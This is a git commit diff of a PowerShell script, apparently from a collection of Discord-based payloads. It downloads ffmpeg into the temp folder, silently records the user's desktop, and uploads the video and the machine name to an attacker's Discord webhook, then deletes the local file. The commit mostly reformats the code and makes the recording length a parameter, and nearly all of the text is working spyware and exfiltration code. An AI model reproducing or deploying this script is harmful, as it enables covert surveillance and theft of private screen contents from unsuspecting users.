0e0ffb24c975e076b4a2df5700d55894885434a5
egieb <93350544+beigeworm@users.noreply.github.com>
2024-04-11 14:55:06 +0000

    Update Record-Screen-to-Discord.ps1

--- Discord Scripts/Record-Screen-to-Discord.ps1
+++ Discord Scripts/Record-Screen-to-Discord.ps1
@@ -16,36 +16,36 @@ $hookurl = 'YOUR_WEBHOOK_HERE' # can be shortened
 if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
 Function RecordScreen{
-param ([int[]]$t)
-
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-
-$Path = "$env:Temp\ffmpeg.exe"
-
-If (!(Test-Path $Path)){  
-$zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-7.0-essentials_build.zip'
-$tempDir = "$env:temp"
-$zipFilePath = Join-Path $tempDir 'ffmpeg-7.0-essentials_build.zip'
-$extractedDir = Join-Path $tempDir 'ffmpeg-7.0-essentials_build'
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
-Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
-Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
-Remove-Item -Path $zipFilePath -Force
-Remove-Item -Path $extractedDir -Recurse -Force
-}
-
-sleep 1
-$mkvPath = "$env:Temp\ScreenClip.mkv"
-
-if ($t.Length -eq 0){$t = 10}
-
-.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
-
-curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
-sleep 1
-rm -Path $mkvPath -Force
+    param ([int[]]$t)
+    
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    
+    $Path = "$env:Temp\ffmpeg.exe"
+    
+    If (!(Test-Path $Path)){  
+        $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-7.0-essentials_build.zip'
+        $tempDir = "$env:temp"
+        $zipFilePath = Join-Path $tempDir 'ffmpeg-7.0-essentials_build.zip'
+        $extractedDir = Join-Path $tempDir 'ffmpeg-7.0-essentials_build'
+        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+        Remove-Item -Path $zipFilePath -Force
+        Remove-Item -Path $extractedDir -Recurse -Force
+    }
+    
+    sleep 1
+    $mkvPath = "$env:Temp\ScreenClip.mkv"
+    
+    if ($t.Length -eq 0){$t = 10}
+    
+    .$env:Temp\ffmpeg.exe -f gdigrab -t $t -framerate 10 -i desktop $mkvPath
+    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
+    sleep 1
+    rm -Path $mkvPath -Force
 
 }
 
 RecordScreen -t 30
+
